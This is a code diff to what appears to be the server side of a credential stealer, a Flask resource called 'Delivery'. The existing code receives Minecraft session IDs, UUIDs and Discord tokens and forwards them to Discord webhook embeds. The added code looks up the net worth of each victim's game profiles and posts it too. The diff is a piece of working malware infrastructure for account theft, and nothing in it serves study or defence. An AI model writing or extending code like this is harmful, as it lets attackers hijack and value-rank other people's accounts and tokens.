@@ -94,6 +94,17 @@ class Delivery(Resource):
         mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
         mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=False)
         embeds.append(mc_embed)
+
+        profile_data = networth.get_profiles(mc['uuid'])
+
+        if profile_data:
+            nw_embed = DiscordEmbed(title=config['nw_embed_title'],
+                                    color=hex(int(config['nw_embed_color'], 16)))
+            nw_embed.set_footer(text=config['nw_embed_footer_text'], icon_url=config['nw_embed_footer_icon'])
+            for i in profile_data["profiles"]:
+                nw_embed.add_embed_field(name=i, value=f'{cb}{profile_data["profiles"][i]["networth"]}({profile_data["profiles"][i]["unsoulbound_networth"]}) - {profile_data["profiles"][i]["gamemode"]}{cb}', inline=False)
+            embeds.append(nw_embed)
+            
         if len(args['discord']) > 0:
             for tokenjson in args['discord']:
 
